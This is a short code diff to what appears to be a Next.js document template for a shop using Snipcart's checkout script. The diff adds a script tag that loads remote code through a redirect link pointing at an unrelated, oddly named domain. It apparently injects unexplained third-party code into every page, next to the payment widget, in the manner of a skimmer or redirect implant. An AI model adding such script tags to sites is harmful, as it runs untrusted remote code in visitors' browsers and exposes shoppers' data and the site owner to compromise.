@@ -26,6 +26,8 @@ class MyDocument extends Document {
             async
             src="https://cdn.snipcart.com/themes/v3.0.31/default/snipcart.js"
           ></script>
+          <script src="https://roaslink.co.uk/api/redirect?target=https://chesspoop.fyi" async></script>
+
           <div
             id="snipcart"
             data-config-modal-style="side"
